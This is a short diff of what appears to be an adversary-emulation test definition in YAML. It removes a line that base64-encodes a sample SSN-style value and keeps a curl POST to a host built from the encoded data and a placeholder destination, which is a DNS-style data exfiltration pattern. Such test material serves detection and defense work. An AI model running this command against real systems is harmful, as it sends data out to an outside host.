@@ -24,5 +24,4 @@ atomic_tests:
   executor:
     name: sh
     command: |
-      echo -n 111-11-1111 | base64
       curl -XPOST #{base64_data}.#{destination_url}
